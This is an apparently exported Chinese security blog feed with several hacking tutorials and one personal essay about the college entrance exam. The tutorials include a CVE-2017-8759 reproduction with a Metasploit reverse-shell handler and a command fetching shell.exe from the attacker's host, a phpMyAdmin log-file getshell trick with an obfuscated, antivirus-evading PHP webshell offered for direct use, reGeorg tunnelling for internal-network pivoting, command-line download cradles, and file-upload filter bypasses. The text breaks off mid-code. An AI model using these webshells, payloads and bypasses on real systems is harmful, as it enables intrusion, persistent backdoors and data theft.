class="hljs-comment">handler):</span>   Name  <span class="hljs-comment">Current Setting  Required  Description</span>   ----  ---------------  --------  -----------Payload <span class="hljs-comment">options (windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp):</span>   Name      <span class="hljs-comment">Current Setting  Required  Description</span>   ----      ---------------  --------  -----------   EXITFUNC  <span class="hljs-comment">process          yes       Exit technique (Accepted:</span> <span class="hljs-comment">&#x27;&#x27;</span><span class="hljs-comment">, seh, thread, process, none)</span>   LHOST     <span class="hljs-comment">192.168.0.124    yes       The listen address</span>   LPORT     <span class="hljs-comment">4444             yes       The listen port</span>Exploit <span class="hljs-comment">target:</span>   Id  <span class="hljs-comment">Name</span>   --  ----   0   Wildcard <span class="hljs-comment">Target</span>msf <span class="hljs-comment">exploit(handler) &gt; exploit</span> [*] Exploit <span class="hljs-comment">running as background job 0.</span>[*] Started <span class="hljs-comment">reverse TCP handler on 192.168.0.124:4444</span></code></pre><p><img src="/images/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/06.png" alt="CVE-2017-8759漏洞复现"></p><p><img src="/images/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/07.png" alt="CVE-2017-8759漏洞复现"></p><p>监听成功，我们进行最后一步</p><p><code>python cve-2017-8759_toolkit.py -M exp -e http://192.168.0.124/shell.exe -l /tmp/shell.exe</code></p><p><img src="/images/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/08.png" alt="CVE-2017-8759漏洞复现"></p><p>我们把rtf文件拖动到win7虚拟机下打开</p><p><img src="/images/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/09.png" alt="CVE-2017-8759漏洞复现"></p><p>可以看到有反弹回来的信息了，不过貌似这系统的msf有问题，卡在那了</p><p><img src="/images/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="CVE-2017-8759漏洞复现"></p><p>我们按ctrl+c停止，再session -l查看下会话列表</p><p>session -i选择会话</p><p><img src="/images/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="CVE-2017-8759漏洞复现"></p><p>成功，接下来怎么玩，我相信各位大佬比我清楚。</p><p>有POC就是牛逼。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>CVE-2017-8759</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>又是一年高考季</title>
    <link href="/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E9%AB%98%E8%80%83%E5%AD%A3.html"/>
    <url>/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E9%AB%98%E8%80%83%E5%AD%A3.html</url>
    
    <content type="html"><![CDATA[<p>写个文章也算是打发下时间吧！</p><p>一转眼又过去了2年了，想想两年前的自己，浑浑噩噩的混完了高中。</p><p>依稀记得高考前一晚还差点和别人打架，具体原因也是因为那几个要好的朋友。</p><p>虽然现在很少联系，但他们一直都在心中。</p><p>高考的前几天，我们一起在走廊上感概，我们的高中经历了什么，一转眼就没了，也许到现在我们都没法得到答案。</p><a id="more"></a><p>虽然现在可以吹牛逼说自己高考考了211。别在意，我说的211是分数，不是学校。</p><p>出成绩那天，查完成绩的我真的是和中彩票一样高兴。</p><p>记得数学是29，这是一个意外的分数，也许是自己隐藏实力太久了吧。</p><p>高中老师都说，大学会很轻松。但愿你不会抱着这种美好的幻想，我会告诉你，都是假的。</p><p>大学给了你疯的时间与机会，却没给你能够陪你一起疯的那群人。</p><p>大学给了我自由恋爱随心所欲的空间和时间，可是我却没有了喜欢的人。</p><p>大学吃饭是一帮人，玩游戏是一帮人，出去玩又是一帮人，而高中这些都是同一帮人。</p><p>关于大学的室友，能忍就忍吧，毕竟要在一起相处三年。</p><p>但是，如果遇到那种大半夜打游戏，还开声音的人，你应该知道怎么做的。</p><p>就像我们宿舍有几个，凌晨4点多还在那打游戏。</p><p>曾经的六人间，变成了现在的二人间。</p><p>一定要上个好大学，真的，好的大学才会让你感受到大学的意义，而辣鸡的大学只是在浪费青春。</p><p>题再难也就高中水平，高考再难顶多也就3天。</p><p>嗯，最后的话。</p><p>喜欢的人能告白还是告白了吧，最起码以后也不遗憾。讨厌的老师该原谅也就原谅了吧，毕竟也是陪你从高三闯出来的人。最好的朋友一定要有完美的告别，要么就保持关系不断。想哭就哭一场吧，这样的日子不多了。校服还是留着吧，这是真正意义上的青春。现在走在大街上，看到穿校服的会很羡慕，感觉那就是青春吧。</p><p>2017届考生，祝好运。</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpmyadmin新姿势getshell</title>
    <link href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/phpmyadmin%E6%96%B0%E5%A7%BF%E5%8A%BFgetshell.html"/>
    <url>/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/phpmyadmin%E6%96%B0%E5%A7%BF%E5%8A%BFgetshell.html</url>
    
    <content type="html"><![CDATA[<h3 id="mysql中的Into-outfile禁用的情况下，我该如何getshell？"><a href="#mysql中的Into-outfile禁用的情况下，我该如何getshell？" class="headerlink" title="mysql中的Into outfile禁用的情况下，我该如何getshell？"></a>mysql中的Into outfile禁用的情况下，我该如何getshell？</h3><p>目前<code>into outfile</code>被禁用</p><p>那么我们尝试通过一个脑洞大开的方法去getshell。</p><p><code>（必须是mysql root权限）</code></p><p>登录phpmyadmin后，查看全局变量：找到<code>general log和general log file</code></p><p><code>general log file</code>是存储了每一个sql语句执行的日志（包含SQL语句本身）</p><a id="more"></a><p>但是<code>general log</code>变量必须是<code>ON</code>状态，代表启用，然后再去更改</p><p><code>general log file</code>的地址为我们的webshell，绝对路径。</p><p><img src="/images/20170317_phpmyadmin%E6%96%B0%E5%A7%BF%E5%8A%BFgetshell/01.png" alt="phpmyadmin新姿势getshell"></p><p>在每一次更改<code>general log file</code>的时候mysql都会判断日志文件是否存在，如果不存在则会自动创建。</p><p>此时该文件已经创建，并且文件内容保存了最后一条SQL语句的日志信息。</p><pre><code class="hljs mysql">MySQLa, Version: 5.5.53 (MySQL Community Server (GPL)). started with: TCP Port: 3306, Named Pipe: MySQL Time Id Command Argument 121 Query SHOW GLOBAL VARIABLES WHERE Variable_name&#x3D;&quot;general_log_file&quot; 121 Quit</code></pre><p>接下来，我们直接随意查询SQL，每一句都会被写入这个ice.php</p><p><img src="/images/20170317_phpmyadmin%E6%96%B0%E5%A7%BF%E5%8A%BFgetshell/02.png" alt="phpmyadmin新姿势getshell"></p><p>下面再附上一个SQL查询免杀shell的语句，方便大家遇到此类情况直接利用：</p><pre><code class="hljs php">SELECT <span class="hljs-string">&quot;&lt;?php</span><span class="hljs-string"><span class="hljs-subst">$p</span> = array(&#x27;f&#x27;=&gt;&#x27;a&#x27;,</span><span class="hljs-string">#afffffffff</span><span class="hljs-string">&#x27;pffff&#x27;=&gt;&#x27;s&#x27;/*223* 1*/,</span><span class="hljs-string">&#x27;e&#x27;=&gt;&#x27;fffff&#x27;,//FJKSJKFSNMFSSDSDS//D*SA/*DSA&amp;*$@&amp;$@&amp;(#*(</span><span class="hljs-string">&#x27;lfaaaa&#x27;=&gt;&#x27;r&#x27;,//FJKSJKFSNMFSSDSDS//D*SA/*DSA&amp;*$@&amp;$@&amp;(#*(;</span><span class="hljs-string">&#x27;nnnnn&#x27;=&gt;&#x27;t&#x27;//&amp;$@&amp;(#*(;</span><span class="hljs-string">);//&amp;$@&amp;(#*(;</span><span class="hljs-string"><span class="hljs-subst">$a</span> = array_keys(<span class="hljs-subst">$p</span>);//9*9*5656</span><span class="hljs-string">@<span class="hljs-subst">$_</span>=<span class="hljs-subst">$p</span>[&#x27;pffff&#x27;].#/*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*/</span><span class="hljs-string"><span class="hljs-subst">$p</span>[&#x27;pffff&#x27;].<span class="hljs-subst">$a</span>[2];</span><span class="hljs-string">@<span class="hljs-subst">$_</span>=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string"><span class="hljs-subst">$p</span>[&#x27;f&#x27;]./*-/*-*/<span class="hljs-subst">$_</span>.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string"><span class="hljs-subst">$p</span>[&#x27;lfaaaa&#x27;].<span class="hljs-subst">$p</span>[&#x27;nnnnn&#x27;];#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">@<span class="hljs-subst">$_</span>#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">(<span class="hljs-subst">$_REQUEST</span>[#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">&#x27;username&#x27;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">]);</span><span class="hljs-string">?&gt;&quot;</span></code></pre><p>密码username</p><p><img src="/images/20170317_phpmyadmin%E6%96%B0%E5%A7%BF%E5%8A%BFgetshell/03.png" alt="phpmyadmin新姿势getshell"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>PHPMYADMIN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透代理之reGeorg+proxifier</title>
    <link href="/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BB%A3%E7%90%86%E4%B9%8BreGeorg-proxifier.html"/>
    <url>/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BB%A3%E7%90%86%E4%B9%8BreGeorg-proxifier.html</url>
    
    <content type="html"><![CDATA[<p>以前从未尝试过 内网渗透 每每拿到内网的机子都是 lcx转发至服务器 而并没有继续 下去</p><p>近来一次安全检测中 遇到主机存在内网中 然后又是站库分离的结构 数据库亦是在内网 于是打算尝试下内网渗透的代理工具reGeorg+proxifier 不错</p><p>可能是见识短浅 因为接触较少 并未尝试过其他工具 以后会慢慢更新</p><a id="more"></a><p><code>reGeorg的github地址：https://github.com/sensepost/reGeorg</code></p><p>是一个sock代理工具  里面包含了 各种的脚本</p><p><img src="/images/20170315_%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BB%A3%E7%90%86%E4%B9%8BreGeorg+proxifier/01.png" alt="内网渗透代理之reGeorg+proxifier"></p><p>**注意：reGeorgSocksProxy脚本使用的时候需要urllib3 模块 **</p><p><strong>请自行安装好（<a href="https://pypi.python.org/pypi/urllib3%EF%BC%89">https://pypi.python.org/pypi/urllib3）</a></strong></p><p><strong>具体可以看这个<a href="http://blog.csdn.net/na_tion/article/details/47728121">http://blog.csdn.net/na_tion/article/details/47728121</a></strong></p><p>proxifier   Proxifier 官网地址：<a href="https://www.proxifier.com/">https://www.proxifier.com</a></p><h3 id="使用过程"><a href="#使用过程" class="headerlink" title="使用过程"></a>使用过程</h3><p>1.将tunnel脚本上传到控制的内网服务器</p><p>2.然后在本机用reGeorgSocksProxy.py做代理</p><p><code>python reGeorgSocksProxy.py -p 8080 -u http://test.com/tunnel/tunnel.jsp</code></p><p>3.在Proxifier中配置</p><p><img src="/images/20170315_%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BB%A3%E7%90%86%E4%B9%8BreGeorg+proxifier/02.png" alt="内网渗透代理之reGeorg+proxifier"></p><p><img src="/images/20170315_%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BB%A3%E7%90%86%E4%B9%8BreGeorg+proxifier/03.png" alt="内网渗透代理之reGeorg+proxifier"></p><p><img src="/images/20170315_%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BB%A3%E7%90%86%E4%B9%8BreGeorg+proxifier/04.png" alt="内网渗透代理之reGeorg+proxifier"></p><p>4.在需要使用代理的软件 右键 选择那个代理 打开就行了</p><p>5.尽情玩耍</p>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cmd下几种常见的下载文件的办法</title>
    <link href="/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/cmd%E4%B8%8B%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%8A%9E%E6%B3%95.html"/>
    <url>/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/cmd%E4%B8%8B%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%8A%9E%E6%B3%95.html</url>
    
    <content type="html"><![CDATA[<p>好久没更新博客了 是时候来加快脚步成长了  接下来慢慢 会更新些笔记</p><h3 id="win-03安装ftp服务"><a href="#win-03安装ftp服务" class="headerlink" title="win 03安装ftp服务"></a>win 03安装ftp服务</h3><p>先在我虚拟机里把ftp安装好 win2003的  打开 控制面板-添加或删除程序-添加、删除组件–应用程序服务器（详细信息）–iis信息服务器（详细信息）–ftp 服务</p><h3 id="1-ftp"><a href="#1-ftp" class="headerlink" title="1.ftp"></a>1.ftp</h3><p>ip：192.168.68.132</p><p>文件：test.txt</p><p>按顺序执行如下代码即可通过ftp来下载文件</p><p>cmd：</p><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> open <span class="hljs-number">192.168</span>.<span class="hljs-number">68.132</span> <span class="hljs-number">21</span>&gt; ftp.txt<span class="hljs-built_in">echo</span> ftp&gt;&gt; ftp.txt<span class="hljs-built_in">echo</span> bin &gt;&gt; ftp.txt<span class="hljs-built_in">echo</span> ftp&gt;&gt; ftp.txt<span class="hljs-built_in">echo</span> GET test.txt &gt;&gt; ftp.txtftp <span class="hljs-literal">-s</span>:ftp.txt</code></pre><p><img src="/images/20170314_cmd%E4%B8%8B%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%8A%9E%E6%B3%95/01.png" alt="cmd下几种常见的下载文件的办法"></p><a id="more"></a><h3 id="2-vbs"><a href="#2-vbs" class="headerlink" title="2.vbs"></a>2.vbs</h3><p>vbs downloader,使用msxml2.xmlhttp和adodb.stream对象</p><p>如下代码保存为.vbs文件：</p><pre><code class="hljs vbscript"><span class="hljs-keyword">Set</span> Post = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Msxml2.XMLHTTP&quot;</span>)<span class="hljs-keyword">Set</span> Shell = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)Post.Open <span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://192.168.68.132/test.txt&quot;</span>,<span class="hljs-number">0</span>Post.Send()<span class="hljs-keyword">Set</span> aGet = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>)aGet.Mode = <span class="hljs-number">3</span>aGet.Type = <span class="hljs-number">1</span>aGet.Open()aGet.Write(Post.responseBody)aGet.SaveToFile <span class="hljs-string">&quot;C:\test\update\test.txt&quot;</span>,<span class="hljs-number">2</span></code></pre><p>对应到cmd下的命令为：</p><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> Post = CreateObject(<span class="hljs-string">&quot;Msxml2.XMLHTTP&quot;</span>) &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> Shell = CreateObject(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>) &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> Post.Open <span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://192.168.68.132/test.txt&quot;</span>,<span class="hljs-number">0</span> &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> Post.Send() &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> aGet = CreateObject(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>) &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.Mode = <span class="hljs-number">3</span> &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.Type = <span class="hljs-number">1</span> &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.Open() &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.Write(Post.responseBody) &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.SaveToFile <span class="hljs-string">&quot;C:\test\update\test.txt&quot;</span>,<span class="hljs-number">2</span> &gt;&gt;download.vbs</code></pre><h3 id="3-powershell"><a href="#3-powershell" class="headerlink" title="3.powershell"></a>3.powershell</h3><p>cmd：</p><pre><code class="hljs powershell">powershell (<span class="hljs-built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://192.168.68.132/test.txt&#x27;</span>,<span class="hljs-string">&#x27;C:\Users\isky\Downloads\test.txt&#x27;</span>)</code></pre><h3 id="4-bitsadmin"><a href="#4-bitsadmin" class="headerlink" title="4.bitsadmin"></a>4.bitsadmin</h3><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带</p><p>使用方法：</p><p>cmd下：</p><pre><code class="hljs powershell">bitsadmin /transfer n http://download.sysinternals.com/files/PSTools.zip C:\Users\isky\Downloads\PSTools.zip</code></pre><p><img src="/images/20170314_cmd%E4%B8%8B%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%8A%9E%E6%B3%95/02.png" alt="cmd下几种常见的下载文件的办法"></p>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传绕过姿势总结</title>
    <link href="/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93.html"/>
    <url>/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93.html</url>
    
    <content type="html"><![CDATA[<p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/01.png" alt="文件上传绕过姿势总结"></p><h1 id="0x00-上传流程概述"><a href="#0x00-上传流程概述" class="headerlink" title="0x00 上传流程概述"></a>0x00 上传流程概述</h1><p>一个文件以http协议上传的时候，将以post请求发送至web服务器。服务器接受并同意后，用户与web服务器建立连接，并且传输数据</p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/02.png" alt="文件上传绕过姿势总结"></p><p>而一般文件上传过程中检测部分由</p><ul><li><p>A 客户端javascript检测 （检测文件扩展名）</p></li><li><p>B 服务端MIME类型检测 （检测Content—Type）</p></li><li><p>C 服务端目录路径检测（检测和path相关参数）</p></li><li><p>D 服务端文件扩展名检测 （检测文件扩展名）</p></li><li><p>E 服务端内容检测 （检测是否含有恶意代码）</p><a id="more"></a></li></ul><h1 id="0x01-客户端检测绕过检测-（js检测）"><a href="#0x01-客户端检测绕过检测-（js检测）" class="headerlink" title="0x01 客户端检测绕过检测 （js检测）"></a>0x01 客户端检测绕过检测 （js检测）</h1><p>这一类型特征就是你会收到一个<code>javascript</code>的弹窗</p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/03.png" alt="文件上传绕过姿势总结"></p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p>利用<code>firebug</code>禁用js<br>通过<code>brup</code>等代理工具</p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/24.png" alt="文件上传绕过姿势总结"></p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/25.png" alt="文件上传绕过姿势总结"><br>即可成功上传</p><h1 id="0x02-服务端检测绕过-（MIME检测）"><a href="#0x02-服务端检测绕过-（MIME检测）" class="headerlink" title="0x02 服务端检测绕过 （MIME检测）"></a>0x02 服务端检测绕过 （MIME检测）</h1><p>一般来说界面如图</p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/04.png" alt="文件上传绕过姿势总结"></p><p>源码类似如下</p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/26.png" alt="文件上传绕过姿势总结"></p><p>可以看到里面仅仅只判断了 <code>Content-Type</code></p><h2 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h2><p>通过<code>brup</code>等代理工具</p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/05.png" alt="文件上传绕过姿势总结"></p><h1 id="0x03-服务端检测绕过-（扩展名检测）"><a href="#0x03-服务端检测绕过-（扩展名检测）" class="headerlink" title="0x03 服务端检测绕过 （扩展名检测）"></a>0x03 服务端检测绕过 （扩展名检测）</h1><p>常常采用一个黑名单或者白名单，对上传的文件的扩展名进行检测，符合条件才允许上传</p><h2 id="绕过方式-2"><a href="#绕过方式-2" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="文件名大小写绕过"><a href="#文件名大小写绕过" class="headerlink" title="文件名大小写绕过"></a>文件名大小写绕过</h3><p>如果，在代码层没有进行大小写统一，用AsP，pHp类似的文件名绕过黑名单</p><h3 id="名单列表绕过"><a href="#名单列表绕过" class="headerlink" title="名单列表绕过"></a>名单列表绕过</h3><p>利用黑名单里没有的，并且能够成功执行的命名，进行绕过，例如php3，php4之类的<br>白名单，截断绕过</p><h3 id="特殊文件名绕过"><a href="#特殊文件名绕过" class="headerlink" title="特殊文件名绕过"></a>特殊文件名绕过</h3><p>在windows下有些文件名是不被允许的，将http包里将文件名改为<code>test.asp.</code>或<code>test.asp_</code>（此处下划线为空格）这种命名方式在windows系统自动去掉点和空格</p><h3 id="截断绕过"><a href="#截断绕过" class="headerlink" title="截断绕过"></a>截断绕过</h3><p>0x00截断绕过，在asp程序有这种漏洞<br>传入name=<code>test.jpg0x00</code><br>type=gettype(name) 此处该函数处理方式从后往前扫描，因为0x00不是扩展名，然后获得出来的文件名即是<code>.jpg</code><br>if（type==jpg）<br>savefiletopath（uploadpath.name，name）但在此处0x00截断最后存入磁盘的是<code>test.jpg</code></p><h3 id="htaccess-文件攻击"><a href="#htaccess-文件攻击" class="headerlink" title=".htaccess 文件攻击"></a>.htaccess 文件攻击</h3><p>在apache里，这个文件作为一个配置文件，可以用来控制所在目录的访问权限以及解析设置。即是，可以通过设置可以将该目录下的所有文件作为php文件来解析，即可绕过</p><h4 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h4><p>利用某些写文件函数复写<code>.htaccess</code>文件，即可任意定义解析名单<br>通过一个.htaccess 文件调用 php 的解析器去解析一个文件名中只要包含”haha”这个字符串的<br>任意文件，所以无论文件名是什么样子，只要包含”haha”这个字符串，都可以被以 php 的方<br>式来解析，是不是相当邪恶，一个自定义的.htaccess 文件就可以以各种各样的方式去绕过很<br>多上传验证机制<br>建立一个<code>.htaccess</code>文件内容如下</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">FilesMatch</span> &quot;<span class="hljs-attr">haha</span>&quot;&gt;</span>SetHandler application/x-httpd-php<span class="hljs-tag">&lt;/<span class="hljs-name">FilesMatch</span>&gt;</span></code></pre><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/06.png" alt="文件上传绕过姿势总结"></p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/07.png" alt="文件上传绕过姿势总结"></p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/08.png" alt="文件上传绕过姿势总结"></p><h1 id="0x04-服务端检测绕过（文件内容检测）"><a href="#0x04-服务端检测绕过（文件内容检测）" class="headerlink" title="0x04 服务端检测绕过（文件内容检测）"></a>0x04 服务端检测绕过（文件内容检测）</h1><h3 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h3><ul><li>jpg文件头</li></ul><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/09.png" alt="文件上传绕过姿势总结"></p><ul><li>gif文件头</li><li><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/10.png" alt="文件上传绕过姿势总结"></li><li>png文件头</li><li><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/11.png" alt="文件上传绕过姿势总结"></li></ul><h4 id="方式-1"><a href="#方式-1" class="headerlink" title="方式"></a>方式</h4><p>常见图片一句话形式</p><pre><code class="hljs php">GIF89a(...some <span class="hljs-keyword">binary</span> data <span class="hljs-keyword">for</span> image...)<span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span>;(... skipping the rest of <span class="hljs-keyword">binary</span> data ...)</code></pre><h3 id="文件加载检测"><a href="#文件加载检测" class="headerlink" title="文件加载检测"></a>文件加载检测</h3><p>这个检测应该是最难绕过的，一般是调用API函数去进行文件加载测试，更有甚者二次渲染</p><h4 id="方式-2"><a href="#方式-2" class="headerlink" title="方式"></a>方式</h4><p>对渲染/加载测试攻击 代码注入绕过<br>对二次渲染攻击 攻击加载器</p><p>代码注入，和文件头的处理方式大致相同不过有了一个限定，你不能破坏这张图片，只能把你要的代码添加在空白区。保持文件结构的完整</p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/12.png" alt="文件上传绕过姿势总结"></p><h4 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h4><p>单独列出来这个方式有点特殊<br>我们如果还是上传一个过加载检测的图片</p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/13.png" alt="文件上传绕过姿势总结"></p><p>然后再从服务器上下载回本地</p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/14.png" alt="文件上传绕过姿势总结"></p><p>并且图片里多了<code>CREATOR: gd-jpeg v1.0 (using IJG JPEG v62)</code><br>说明使用GD php 的gd库</p><p>这里是某后台的调用GD库二次渲染的代码</p><pre><code class="hljs python">function image_gd_open($file, $extension)&#123;$extension = str_replace(<span class="hljs-string">&#x27;jpg&#x27;</span>, 